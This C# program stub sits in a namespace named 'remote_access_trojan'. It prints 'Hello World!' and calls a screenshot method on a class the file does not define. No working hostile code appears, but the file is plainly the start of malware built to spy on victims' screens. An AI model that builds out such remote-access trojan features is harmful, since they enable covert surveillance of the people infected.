using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace remote_access_trojan
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");

            Screenshot screenshotManager = new Screenshot();
            screenshotManager.takeScreenshot();
        }
    }
}
